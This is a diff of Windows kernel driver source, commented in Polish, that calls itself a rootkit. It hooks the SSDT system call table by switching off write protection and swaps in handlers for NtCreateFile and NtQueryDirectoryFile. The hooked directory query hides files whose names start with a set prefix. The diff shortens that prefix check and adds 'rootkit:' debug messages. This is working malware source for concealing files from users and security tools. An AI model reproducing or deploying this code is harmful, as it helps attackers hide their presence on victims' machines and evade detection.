@@ -48,7 +48,7 @@ VOID HookApis()
 		irql = RaiseIRQLevel();
 
 		WPOFF();
-		DbgPrint("Hookowanie tablicy SSDT\n");
+		DbgPrint("rootkit: Hookowanie tablicy SSDT\n");
 		// NtCreateFile
 		OldNtCreateFile	= SYSCALL( currentAPI.NtCreateFileIndex );
 		SYSCALL( currentAPI.NtCreateFileIndex ) = HookNtCreateFile;
@@ -155,12 +155,9 @@ NTSTATUS HookNtQueryDirectoryFile(
 			PathMask,
 			bRestartQuery);
 
-    DbgPrint("OK\n");
-
 	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
 	currentEprocess = PsGetCurrentProcess();
 	if (IsPriviligedProcess( currentEprocess ) ) {
-        DbgPrint("HookNtQueryDirectoryFile> IsPriviligedProcess == true\n");
 		return rc;
 	}
 
@@ -182,9 +179,10 @@ NTSTATUS HookNtQueryDirectoryFile(
 				
 				// compare directory-name prefix with '_root_' to decide if to hide or not.
 
-				if (getDirEntryFileLength(p,FileInfoClass) >= 18) {
-					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 12 ) == 12 ) 
+				if (getDirEntryFileLength(p,FileInfoClass) >= 8) {
+					if( RtlCompareMemory( getDirEntryFileName(p,FileInfoClass), (PVOID)&hidePrefixW.Buffer[ 0 ], 8 ) == 8 ) 
 					{
+                        DbgPrint("rootkit: Chowam plik\n");
 						if( bLastOne ) 
 						{
 							if( p == FileInformationBuffer ) rc = 0x80000006;
@@ -228,7 +226,6 @@ NTSTATUS HookNtCreateFile(
 
 	currentEprocess = PsGetCurrentProcess();
 	if (IsPriviligedProcess( currentEprocess ) ) {
-        DbgPrint("HookNtCreateFile> IsPriviligedProcess == true\n");                             
 		goto pass_throught;
 	}
 
